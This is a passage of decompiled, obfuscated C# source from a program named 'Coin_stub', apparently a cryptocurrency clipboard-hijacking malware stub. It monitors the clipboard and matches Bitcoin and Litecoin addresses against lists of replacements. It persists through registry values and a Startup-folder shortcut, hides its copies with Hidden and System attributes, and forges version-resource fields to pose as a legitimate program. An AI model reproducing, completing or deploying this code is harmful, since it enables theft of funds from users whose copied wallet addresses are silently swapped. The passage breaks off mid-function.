using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Coin_stub.Properties;
using Microsoft.Win32;
using SmartAssembly.MemoryManagement;
using ns0;
using ns1;
using ns2;
using ns3;
using ns5;
using ns6;
using ns7;
using ns8;

namespace ns4;

internal sealed class Class23
{
	static void smethod_0()
	{
		try
		{
			if (Environment.OSVersion.Platform == PlatformID.Win32NT)
			{
				MemoryManager.memoryManager_0 = new MemoryManager();
			}
		}
		catch
		{
		}
	}

	static void smethod_1(Class17.Class18 class18_0)
	{
		Class17.smethod_0(class18_0.string_0);
	}

	static void smethod_2(ushort ushort_0, Class5 class5_0)
	{
		class5_0.string_0 = $"{Class23.smethod_61(class5_0):x4}{ushort_0:x4}";
	}

	static long smethod_3(BinaryWriter binaryWriter_0, ushort ushort_0)
	{
		while (ushort_0-- > 0)
		{
			binaryWriter_0.Write((byte)0);
		}
		return binaryWriter_0.BaseStream.Position;
	}

	static ushort smethod_4()
	{
		return Class23.smethod_108(0, 0);
	}

	static string smethod_5(Class11 class11_0)
	{
		if (class11_0.string_1 == null)
		{
			return class11_0.string_1;
		}
		return class11_0.string_1.Substring(0, class11_0.string_1.Length - 1);
	}

	static short smethod_6(int int_0)
	{
		return (short)((Class35.Class41.byte_0[int_0 & 0xF] << 12) | (Class35.Class41.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class35.Class41.byte_0[(int_0 >> 8) & 0xF] << 4) | Class35.Class41.byte_0[int_0 >> 12]);
	}

	[DllImport("User32.dll", CharSet = CharSet.Auto)]
	static extern bool ChangeClipboardChain(IntPtr intptr_0, IntPtr intptr_1);

	static void smethod_7()
	{
		Application.Run((Form)(object)new Form0());
	}

	static Dictionary<string, Class2> smethod_8(Class16 class16_0)
	{
		return class16_0.dictionary_0;
	}

	static void smethod_9(Class11 class11_0, string string_0)
	{
		if (string_0 == null)
		{
			class11_0.string_1 = null;
			class11_0.struct0_0.ushort_1 = 0;
			return;
		}
		if (string_0.Length != 0 && string_0[string_0.Length - 1] == '\0')
		{
			class11_0.string_1 = string_0;
		}
		else
		{
			class11_0.string_1 = string_0 + '\0';
		}
		class11_0.struct0_0.ushort_1 = (ushort)class11_0.string_1.Length;
	}

	static void smethod_10(IntPtr intptr_0, Class10 class10_0)
	{
		class10_0.intptr_0 = (Class23.smethod_109(intptr_0) ? intptr_0 : Marshal.StringToHGlobalUni(Marshal.PtrToStringUni(intptr_0)));
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	static extern bool FreeLibrary(IntPtr intptr_0);

	static void smethod_11(Class2 class2_0, Class21.Struct0 struct0_0)
	{
		class2_0.struct0_0 = struct0_0;
	}

	static void smethod_12(IntPtr intptr_0, IntPtr intptr_1, Class13 class13_0)
	{
		if (!(intptr_1 == IntPtr.Zero))
		{
			IntPtr intPtr = Class23.LockResource(intptr_1);
			if (intPtr == IntPtr.Zero)
			{
				throw new Win32Exception(Marshal.GetLastWin32Error());
			}
			class13_0.vmethod_1(intptr_0, intPtr);
		}
	}

	static int smethod_13(Class35.Class38 class38_0, Class35.Class37 class37_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class38_0.int_1), Class23.smethod_31(class37_0));
		int num = 32768 - class38_0.int_0;
		int num2;
		if (int_0 > num)
		{
			num2 = Class23.smethod_55(class37_0, class38_0.byte_0, class38_0.int_0, num);
			if (num2 == num)
			{
				num2 += Class23.smethod_55(class37_0, class38_0.byte_0, 0, int_0 - num);
			}
		}
		else
		{
			num2 = Class23.smethod_55(class37_0, class38_0.byte_0, class38_0.int_0, int_0);
		}
		class38_0.int_0 = (class38_0.int_0 + num2) & 0x7FFF;
		class38_0.int_1 += num2;
		return num2;
	}

	static void smethod_14(string string_0, Class16 class16_0)
	{
		Class23.smethod_111(class16_0.class22_0, string_0);
	}

	static ICryptoTransform smethod_15(byte[] byte_0, bool bool_0, byte[] byte_1, Class33 class33_0)
	{
		class33_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class33_0.object_0, new object[1] { byte_0 });
		class33_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class33_0.object_0, new object[1] { byte_1 });
		MethodInfo method = class33_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class33_0.object_0, new object[0]);
	}

	static Class35.Class39 smethod_16(Class35.Class40 class40_0)
	{
		byte[] array = new byte[class40_0.int_4];
		Array.Copy(class40_0.byte_1, class40_0.int_3, array, 0, class40_0.int_4);
		return new Class35.Class39(array);
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	static extern IntPtr FindResourceExW(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, ushort ushort_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	static extern int SizeofResource(IntPtr intptr_0, IntPtr intptr_1);

	static string smethod_17(Class11 class11_0)
	{
		return class11_0.string_0;
	}

	static ushort smethod_18(Class5 class5_0)
	{
		if (string.IsNullOrEmpty(class5_0.string_0))
		{
			return 0;
		}
		return Convert.ToUInt16(class5_0.string_0.Substring(4, 4), 16);
	}

	static void smethod_19(Class35.Class37 class37_0, int int_0)
	{
		class37_0.uint_0 >>= int_0;
		class37_0.int_2 -= int_0;
	}

	static Dictionary<string, Class5> smethod_20(Class3 class3_0)
	{
		return class3_0.dictionary_0;
	}

	static void smethod_21(string string_0, Class22 class22_0)
	{
		uint num = 0u;
		uint num2 = 0u;
		uint num3 = 0u;
		uint num4 = 0u;
		string[] array = string_0.Split(".".ToCharArray(), 4);
		if (array.Length >= 1)
		{
			num = uint.Parse(array[0]);
		}
		if (array.Length >= 2)
		{
			num2 = uint.Parse(array[1]);
		}
		if (array.Length >= 3)
		{
			num3 = uint.Parse(array[2]);
		}
		if (array.Length >= 4)
		{
			num4 = uint.Parse(array[3]);
		}
		class22_0.struct2_0.uint_4 = (num << 16) + num2;
		class22_0.struct2_0.uint_5 = (num3 << 16) + num4;
	}

	static bool smethod_22(Class35.Class36 class36_0)
	{
		int num = Class23.smethod_113(class36_0.class38_0);
		while (num >= 258)
		{
			switch (class36_0.int_4)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class23.smethod_71(class36_0.class39_0, class36_0.class37_0)) & -256) == 0)
				{
					Class23.smethod_93(class36_0.class38_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class36_0.int_6 = Class35.Class36.int_0[num2 - 257];
					class36_0.int_5 = Class35.Class36.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class36_0.class39_1 = null;
				class36_0.class39_0 = null;
				class36_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class36_0.int_5 > 0)
				{
					class36_0.int_4 = 8;
					int num4 = Class23.smethod_62(class36_0.class37_0, class36_0.int_5);
					if (num4 < 0)
					{
						return false;
					}
					Class23.smethod_19(class36_0.class37_0, class36_0.int_5);
					class36_0.int_6 += num4;
				}
				class36_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class23.smethod_71(class36_0.class39_1, class36_0.class37_0);
				if (num2 >= 0)
				{
					class36_0.int_7 = Class35.Class36.int_2[num2];
					class36_0.int_5 = Class35.Class36.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class36_0.int_5 > 0)
				{
					class36_0.int_4 = 10;
					int num3 = Class23.smethod_62(class36_0.class37_0, class36_0.int_5);
					if (num3 < 0)
					{
						return false;
					}
					Class23.smethod_19(class36_0.class37_0, class36_0.int_5);
					class36_0.int_7 += num3;
				}
				Class23.smethod_78(class36_0.class38_0, class36_0.int_6, class36_0.int_7);
				num -= class36_0.int_6;
				class36_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static int smethod_23(Class35.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static void smethod_24(IntPtr intptr_0, Class11 class11_0)
	{
		class11_0.struct0_0 = (Class21.Struct0)Marshal.PtrToStructure(intptr_0, typeof(Class21.Struct0));
		IntPtr ptr = new IntPtr(intptr_0.ToInt32() + Marshal.SizeOf((object)class11_0.struct0_0));
		class11_0.string_0 = Marshal.PtrToStringUni(ptr);
		IntPtr ptr2 = new IntPtr((ptr.ToInt32() + (class11_0.string_0.Length + 1) * Marshal.SystemDefaultCharSize + 3) & -4);
		class11_0.string_1 = ((class11_0.struct0_0.ushort_1 > 0) ? Marshal.PtrToStringUni(ptr2, class11_0.struct0_0.ushort_1) : null);
	}

	static bool smethod_25(Class35.Class37 class37_0)
	{
		return class37_0.int_0 == class37_0.int_1;
	}

	static ushort smethod_26()
	{
		return Class23.smethod_108(1, 9);
	}

	static ushort smethod_27(Class22 class22_0)
	{
		return (ushort)Marshal.SizeOf((object)class22_0.struct2_0);
	}

	static Class10 smethod_28(Class13 class13_0)
	{
		return class13_0.class10_1;
	}

	static void smethod_29(ushort ushort_0, Class10 class10_0, Class10 class10_1, string string_0, byte[] byte_0)
	{
		IntPtr intPtr = Class23.BeginUpdateResourceW(string_0, bool_0: false);
		if (intPtr == IntPtr.Zero)
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
		if (!Class23.UpdateResourceW(intPtr, class10_0.intptr_0, class10_1.intptr_0, ushort_0, byte_0, (byte_0 != null) ? ((uint)byte_0.Length) : 0u))
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
		if (!Class23.EndUpdateResourceW(intPtr, bool_0: false))
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
	}

	static void smethod_30()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class23.smethod_84;
		}
		catch
		{
		}
	}

	static int smethod_31(Class35.Class37 class37_0)
	{
		return class37_0.int_1 - class37_0.int_0 + (class37_0.int_2 >> 3);
	}

	static int smethod_32(int int_0, Class35.Class38 class38_0, int int_1, byte[] byte_0)
	{
		int num = class38_0.int_0;
		if (int_1 > class38_0.int_1)
		{
			int_1 = class38_0.int_1;
		}
		else
		{
			num = (class38_0.int_0 - class38_0.int_1 + int_1) & 0x7FFF;
		}
		int num2 = int_1;
		int num3 = int_1 - num;
		if (num3 > 0)
		{
			Array.Copy(class38_0.byte_0, 32768 - num3, byte_0, int_0, num3);
			int_0 += num3;
			int_1 = num;
		}
		Array.Copy(class38_0.byte_0, num - int_1, byte_0, int_0, int_1);
		class38_0.int_1 -= num2;
		if (class38_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return num2;
	}

	static void smethod_33()
	{
		try
		{
			Class7 class7_ = new Class7(Application.get_ExecutablePath());
			string text = Class23.smethod_85() + "\\" + Class8.string_4 + ".exe";
			if (!Class23.smethod_52(Class19.string_5))
			{
				try
				{
					Class23.smethod_51(class7_);
				}
				catch
				{
				}
				try
				{
					Class7 class7_2 = new Class7(text);
					Class23.smethod_43(Class7.Enum4.const_0, class7_2);
					Class23.smethod_51(class7_2);
				}
				catch
				{
				}
			}
			if (!File.Exists(text))
			{
				try
				{
					Class7 class7_2 = new Class7(text);
					text = Class23.smethod_85() + "\\" + Class8.string_4 + ".exe";
					Class23.smethod_90(text, class7_);
				}
				catch
				{
				}
				try
				{
					Class23.smethod_51(class7_);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch
		{
		}
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	static extern IntPtr LockResource(IntPtr intptr_0);

	static void smethod_34(ushort ushort_0, Class13 class13_0)
	{
		class13_0.ushort_0 = ushort_0;
	}

	static void smethod_35(Class22 class22_0, BinaryWriter binaryWriter_0)
	{
		binaryWriter_0.Write(Class12.smethod_0(class22_0.struct2_0));
		Class23.smethod_87(binaryWriter_0);
	}

	static bool smethod_36(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_1.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_0.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static void smethod_37(object sender, Settings e, SettingChangingEventArgs settingChangingEventArgs_0)
	{
	}

	static Class21.Struct0 smethod_38(Class2 class2_0)
	{
		return class2_0.struct0_0;
	}

	static void smethod_39(object sender, CancelEventArgs e, Settings settings_0)
	{
	}

	static byte[] smethod_40(Class14 class14_0)
	{
		return class14_0.byte_0;
	}

	static bool smethod_41(Class10 class10_0)
	{
		return Class23.smethod_109(class10_0.intptr_0);
	}

	static int smethod_42(Class35.Stream0 stream0_0)
	{
		return Class23.smethod_23(stream0_0) | (Class23.smethod_23(stream0_0) << 16);
	}

	static void smethod_43(Class7.Enum4 enum4_0, Class7 class7_0)
	{
		if (enum4_0 == Class7.Enum4.const_0)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class19.string_6, writable: true);
			registryKey.SetValue(Class19.string_5, class7_0.string_0);
			registryKey.Close();
			registryKey = Registry.CurrentUser.OpenSubKey(Class19.string_8, writable: true);
			registryKey.SetValue(Class19.string_7, class7_0.string_0);
			registryKey.Close();
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + Path.GetRandomFileName() + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + class7_0.string_0);
		streamWriter.WriteLine("IconIndex=0");
		string text = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
		streamWriter.Flush();
	}

	static int smethod_44(char char_0, string string_0)
	{
		Process process = new Process();
		string text = Class23.smethod_85() + "\\" + Class8.string_4 + ".exe";
		if (char_0 == 'C')
		{
			Class15 @class = new Class15();
			@class.class10_1 = new Class10((ushort)((int)Class19.ushort_2 / 16 + 1));
			@class.vmethod_0(text);
			string[] array = Class20.smethod_0(@class[Class19.ushort_2]).Split(new char[1] { Class19.char_0 });
			Class7 class7_ = new Class7(Application.get_ExecutablePath());
			text = Path.GetTempPath() + array[4] + ".exe";
			Class23.smethod_90(text, class7_);
			File.SetAttributes(text, FileAttributes.Normal);
			Class23.smethod_64(text);
			File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
			process.StartInfo.Arguments = char_0 + ":" + string_0;
		}
		process.StartInfo.FileName = text;
		process.Start();
		return process.Id;
	}

	static Dictionary<string, Class6> smethod_45(Class4 class4_0)
	{
		return class4_0.dictionary_0;
	}

	static string smethod_46(Class10 class10_0)
	{
		if (!Class23.smethod_41(class10_0))
		{
			return Marshal.PtrToStringUni(class10_0.intptr_0);
		}
		return class10_0.intptr_0.ToString();
	}

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	static extern bool UpdateResourceW(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, ushort ushort_0, byte[] byte_0, uint uint_0);

	static void smethod_47(Class11 class11_0, BinaryWriter binaryWriter_0)
	{
		long position = binaryWriter_0.BaseStream.Position;
		binaryWriter_0.Write(class11_0.struct0_0.ushort_0);
		binaryWriter_0.Write(class11_0.struct0_0.ushort_1);
		binaryWriter_0.Write(class11_0.struct0_0.ushort_2);
		binaryWriter_0.Write(Encoding.Unicode.GetBytes(class11_0.string_0));
		binaryWriter_0.Write((ushort)0);
		Class23.smethod_87(binaryWriter_0);
		long position2 = binaryWriter_0.BaseStream.Position;
		if (class11_0.string_1 != null)
		{
			binaryWriter_0.Write(Encoding.Unicode.GetBytes(class11_0.string_1));
		}
		Class23.smethod_98(binaryWriter_0, (binaryWriter_0.BaseStream.Position - position2) / Marshal.SystemDefaultCharSize, position + 2L);
		Class23.smethod_98(binaryWriter_0, binaryWriter_0.BaseStream.Position - position, position);
	}

	static IntPtr smethod_48(Class10 class10_0)
	{
		return class10_0.intptr_0;
	}

	static void smethod_49(Class10 class10_0, ushort ushort_0, string string_0, Class13 class13_0, Class10 class10_1)
	{
		IntPtr intPtr = IntPtr.Zero;
		try
		{
			intPtr = Class23.LoadLibraryEx(string_0, IntPtr.Zero, 3u);
			Class23.smethod_96(intPtr, ushort_0, class10_0, class10_1, class13_0);
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				Class23.FreeLibrary(intPtr);
			}
		}
	}

	unsafe static void smethod_50(Form0 form0_0)
	{
		form0_0.control0_0 = new Control0();
		((Control)form0_0).SuspendLayout();
		((Control)form0_0.control0_0).set_BackColor(Color.Red);
		((Control)form0_0.control0_0).set_Location(new Point(0, 0));
		((Control)form0_0.control0_0).set_Name("clm");
		((Control)form0_0.control0_0).set_Size(new Size(75, 23));
		((Control)form0_0.control0_0).set_TabIndex(1);
		((Control)form0_0.control0_0).set_Text("clm");
		((Control)form0_0.control0_0).set_Visible(false);
		Control0 control0_ = form0_0.control0_0;
		EventHandler<EventArgs0> eventHandler_ = new EventHandler<EventArgs0>(form0_0, (nint)(delegate*<Form0, object, EventArgs0, void>)(&Class23.smethod_105));
		Class23.smethod_101(eventHandler_, control0_);
		((Form)form0_0).set_ClientSize(new Size(284, 262));
		((Control)form0_0).get_Controls().Add((Control)(object)form0_0.control0_0);
		((Control)form0_0).set_Name("WM_Handler");
		((Control)form0_0).ResumeLayout(false);
	}

	static void smethod_51(Class7 class7_0)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(class7_0.string_0);
			fileInfo.Attributes = fileInfo.Attributes | FileAttributes.Hidden | FileAttributes.System;
		}
		catch
		{
		}
	}

	static bool smethod_52(string string_0)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class19.string_6, writable: true);
		string[] valueNames = registryKey.GetValueNames();
		string[] array = valueNames;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				string text = array[num];
				if (text.Equals(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			registryKey.Close();
			return false;
		}
		return true;
	}

	static void smethod_53()
	{
		try
		{
			Class23.smethod_30();
		}
		catch (Exception)
		{
		}
	}

	static IntPtr smethod_54(int int_0)
	{
		return new IntPtr((int_0 + 3) & -4);
	}

	static int smethod_55(Class35.Class37 class37_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		while (class37_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class37_0.uint_0;
			class37_0.uint_0 >>= 8;
			class37_0.int_2 -= 8;
			int_1--;
			num++;
		}
		if (int_1 == 0)
		{
			return num;
		}
		int num2 = class37_0.int_1 - class37_0.int_0;
		if (int_1 > num2)
		{
			int_1 = num2;
		}
		Array.Copy(class37_0.byte_0, class37_0.int_0, byte_0, int_0, int_1);
		class37_0.int_0 += int_1;
		if (((uint)(class37_0.int_0 - class37_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class37_0.uint_0 = class37_0.byte_0[class37_0.int_0++] & 0xFFu;
			class37_0.int_2 = 8;
		}
		return num + int_1;
	}

	static int smethod_56(Class35.Class38 class38_0)
	{
		return class38_0.int_1;
	}

	static void smethod_57(int int_0, int int_1, Class35.Class37 class37_0, byte[] byte_0)
	{
		if (class37_0.int_0 < class37_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_1 + int_0;
		if (0 <= int_1 && int_1 <= num && num <= byte_0.Length)
		{
			if (((uint)int_0 & (true ? 1u : 0u)) != 0)
			{
				class37_0.uint_0 |= (uint)((byte_0[int_1++] & 0xFF) << class37_0.int_2);
				class37_0.int_2 += 8;
			}
			class37_0.byte_0 = byte_0;
			class37_0.int_0 = int_1;
			class37_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static byte[] smethod_58(Class13 class13_0)
	{
		MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream, Encoding.Default);
		class13_0.vmethod_2(binaryWriter);
		binaryWriter.Close();
		return memoryStream.ToArray();
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	static extern IntPtr LoadResource(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	static extern IntPtr BeginUpdateResourceW(string string_0, bool bool_0);

	static string smethod_59(Class11 class11_0)
	{
		return class11_0.string_1;
	}

	static string smethod_60(Class2 class2_0)
	{
		return class2_0.string_0;
	}

	static ushort smethod_61(Class5 class5_0)
	{
		if (string.IsNullOrEmpty(class5_0.string_0))
		{
			return 0;
		}
		return Convert.ToUInt16(class5_0.string_0.Substring(0, 4), 16);
	}

	static int smethod_62(Class35.Class37 class37_0, int int_0)
	{
		if (class37_0.int_2 < int_0)
		{
			if (class37_0.int_0 == class37_0.int_1)
			{
				return -1;
			}
			class37_0.uint_0 |= (uint)(((class37_0.byte_0[class37_0.int_0++] & 0xFF) | ((class37_0.byte_0[class37_0.int_0++] & 0xFF) << 8)) << class37_0.int_2);
			class37_0.int_2 += 16;
		}
		return (int)(class37_0.uint_0 & ((1 << int_0) - 1));
	}

	static string smethod_63()
	{
		Random random = new Random();
		int num = random.Next(0, 100);
		if (Class8.bool_0 & (num < Class8.int_2))
		{
			num = random.Next(0, Class8.string_2.GetUpperBound(0));
			return Class8.string_2[num];
		}
		num = random.Next(0, Class8.string_0.GetUpperBound(0));
		return Class8.string_0[num];
	}

	static void smethod_64(string string_0)
	{
		Class15 @class = new Class15();
		@class.class10_1 = new Class10((ushort)((int)Class19.ushort_2 / 16 + 1));
		@class.vmethod_0(string_0);
		string[] array = Class20.smethod_0(@class[Class19.ushort_2]).Split(new char[1] { Class19.char_0 });
		Class16 class2 = new Class16();
		Class23.smethod_14(array[0], class2);
		Class23.smethod_65(class2, array[1]);
		class2.ushort_0 = 0;
		Class3 class3 = new Class3();
		class2[class3.string_0] = class3;
		Class5 class4 = new Class5();
		Class23.smethod_81(class4, (ushort)0);
		Class23.smethod_2((ushort)1200, class4);
		class3.dictionary_0.Add(class4.string_0, class4);
		class4["Comments"] = array[2];
		class4["CompanyName"] = array[3];
		class4["FileDescription"] = array[4];
		class4["FileVersion"] = array[1];
		class4["InternalName"] = array[4] + ".exe";
		class4["LegalCopyright"] = array[5];
		class4["LegalTrademarks"] = array[6];
		class4["OriginalFilename"] = array[4] + ".exe";
		class4["ProductName"] = array[7];
		class4["ProductVersion"] = array[1];
		class4["Assembly Version"] = array[1];
		Class4 class5 = new Class4();
		class2[class5.string_0] = class5;
		Class6 class6 = new Class6("Translation");
		class5.dictionary_0.Add(class6.string_0, class6);
		class6[0] = 1200;
		class2.vmethod_3(string_0);
	}

	static void smethod_65(Class16 class16_0, string string_0)
	{
		Class23.smethod_21(string_0, class16_0.class22_0);
	}

	static void smethod_66(string string_0, ref string[] string_1, ref string[] string_2)
	{
		string text = string.Empty;
		string text2 = string.Empty;
		try
		{
			Class15 @class = new Class15();
			@class.class10_1 = new Class10((ushort)((int)Class19.ushort_0 / 16 + 1));
			@class.vmethod_0(string_0);
			string text3 = @class[Class19.ushort_0];
			text3 = text3.Replace(Class19.string_0, "");
			string[] array = new string[0];
			string[] separator = new string[1] { Class19.string_1 };
			array = Class20.smethod_0(text3).Split(separator, StringSplitOptions.RemoveEmptyEntries);
			string[] array2 = array;
			foreach (string text4 in array2)
			{
				string[] array3 = text4.Split(new char[1] { ' ' });
				if (array3[0] == "BTC")
				{
					text = text + array3[1] + "#";
				}
				else
				{
					text2 = text2 + array3[1] + "#";
				}
			}
			char[] separator2 = new char[1] { '#' };
			string_1 = text.Split(separator2, StringSplitOptions.RemoveEmptyEntries);
			string_2 = text2.Split(separator2, StringSplitOptions.RemoveEmptyEntries);
		}
		catch
		{
		}
	}

	static int smethod_67(int int_0, byte[] byte_0, Class35.Class36 class36_0, int int_1)
	{
		int num = 0;
		do
		{
			if (class36_0.int_4 != 11)
			{
				int num2 = Class23.smethod_32(int_0, class36_0.class38_0, int_1, byte_0);
				int_0 += num2;
				num += num2;
				int_1 -= num2;
				if (int_1 == 0)
				{
					return num;
				}
			}
		}
		while (Class23.smethod_74(class36_0) || (class36_0.class38_0.int_1 > 0 && class36_0.int_4 != 11));
		return num;
	}

	static void smethod_68(Class35.Class39 class39_0, byte[] byte_0)
	{
		int[] array = new int[16];
		int[] array2 = new int[16];
		foreach (int num in byte_0)
		{
			if (num > 0)
			{
				int[] array3;
				int[] array4 = (array3 = array);
				nint num2 = num;
				array4[num] = array3[num2] + 1;
			}
		}
		int num3 = 0;
		int num4 = 512;
		for (int j = 1; j <= 15; j++)
		{
			array2[j] = num3;
			num3 += array[j] << 16 - j;
			if (j >= 10)
			{
				int num5 = array2[j] & 0x1FF80;
				int num6 = num3 & 0x1FF80;
				num4 += num6 - num5 >> 16 - j;
			}
		}
		class39_0.short_0 = new short[num4];
		int num7 = 512;
		for (int num8 = 15; num8 >= 10; num8--)
		{
			int num9 = num3 & 0x1FF80;
			num3 -= array[num8] << 16 - num8;
			int num10 = num3 & 0x1FF80;
			for (int k = num10; k < num9; k += 128)
			{
				class39_0.short_0[Class23.smethod_6(k)] = (short)((-num7 << 4) | num8);
				num7 += 1 << num8 - 9;
			}
		}
		for (int l = 0; l < byte_0.Length; l++)
		{
			int num11 = byte_0[l];
			if (num11 == 0)
			{
				continue;
			}
			num3 = array2[num11];
			int num12 = Class23.smethod_6(num3);
			if (num11 <= 9)
			{
				do
				{
					class39_0.short_0[num12] = (short)((l << 4) | num11);
					num12 += 1 << num11;
				}
				while (num12 < 512);
			}
			else
			{
				int num13 = class39_0.short_0[num12 & 0x1FF];
				int num14 = 1 << (num13 & 0xF);
				num13 = -(num13 >> 4);
				do
				{
					class39_0.short_0[num13 | (num12 >> 9)] = (short)((l << 4) | num11);
					num12 += 1 << num11;
				}
				while (num12 < num14);
			}
			array2[num11] = num3 + (1 << 16 - num11);
		}
	}

	static int smethod_69(Class35.Class37 class37_0)
	{
		return class37_0.int_2;
	}

	static int smethod_70(string string_0)
	{
		string pattern = "([1-9A-HJ-NP-Za-km-z])";
		Regex regex = new Regex(pattern);
		if (regex.IsMatch(string_0) && ((26 < string_0.Length) & (string_0.Length < 35)))
		{
			if (string_0[0] == '1')
			{
				return 1;
			}
			if (string_0[0] == 'L')
			{
				return 2;
			}
		}
		return 0;
	}

	static int smethod_71(Class35.Class39 class39_0, Class35.Class37 class37_0)
	{
		int num;
		int num2;
		if ((num = Class23.smethod_62(class37_0, 9)) >= 0)
		{
			if ((num2 = class39_0.short_0[num]) >= 0)
			{
				Class23.smethod_19(class37_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num3 = -(num2 >> 4);
			int int_ = num2 & 0xF;
			if ((num = Class23.smethod_62(class37_0, int_)) >= 0)
			{
				num2 = class39_0.short_0[num3 | (num >> 9)];
				Class23.smethod_19(class37_0, num2 & 0xF);
				return num2 >> 4;
			}
			int int_2 = class37_0.int_2;
			num = Class23.smethod_62(class37_0, int_2);
			num2 = class39_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= int_2)
			{
				Class23.smethod_19(class37_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int int_3 = class37_0.int_2;
		num = Class23.smethod_62(class37_0, int_3);
		num2 = class39_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= int_3)
		{
			Class23.smethod_19(class37_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static ushort smethod_72(uint uint_0)
	{
		return (ushort)(uint_0 & 0xFFFFu);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	static extern int SendMessage(IntPtr intptr_0, int int_0, IntPtr intptr_1, IntPtr intptr_2);

	static void smethod_73(Class10 class10_0, string string_0)
	{
		class10_0.intptr_0 = Marshal.StringToHGlobalUni(string_0);
	}

	static bool smethod_74(Class35.Class36 class36_0)
	{
		switch (class36_0.int_4)
		{
		case 2:
		{
			if (class36_0.bool_0)
			{
				class36_0.int_4 = 12;
				return false;
			}
			int num = Class23.smethod_62(class36_0.class37_0, 3);
			if (num < 0)
			{
				return false;
			}
			Class23.smethod_19(class36_0.class37_0, 3);
			if (((uint)num & (true ? 1u : 0u)) != 0)
			{
				class36_0.bool_0 = true;
			}
			switch (num >> 1)
			{
			case 0:
				Class23.smethod_112(class36_0.class37_0);
				class36_0.int_4 = 3;
				break;
			case 1:
				class36_0.class39_0 = Class35.Class39.class39_0;
				class36_0.class39_1 = Class35.Class39.class39_1;
				class36_0.int_4 = 7;
				break;
			case 2:
				class36_0.class40_0 = new Class35.Class40();
				class36_0.int_4 = 6;
				break;
			}
			return true;
		}
		case 3:
			if ((class36_0.int_8 = Class23.smethod_62(class36_0.class37_0, 16)) < 0)
			{
				return false;
			}
			Class23.smethod_19(class36_0.class37_0, 16);
			class36_0.int_4 = 4;
			goto case 4;
		case 4:
		{
			int num2 = Class23.smethod_62(class36_0.class37_0, 16);
			if (num2 < 0)
			{
				return false;
			}
			Class23.smethod_19(class36_0.class37_0, 16);
			class36_0.int_4 = 5;
			goto case 5;
		}
		case 5:
		{
			int num3 = Class23.smethod_13(class36_0.class38_0, class36_0.class37_0, class36_0.int_8);
			class36_0.int_8 -= num3;
			if (class36_0.int_8 == 0)
			{
				class36_0.int_4 = 2;
				return true;
			}
			return !Class23.smethod_25(class36_0.class37_0);
		}
		case 6:
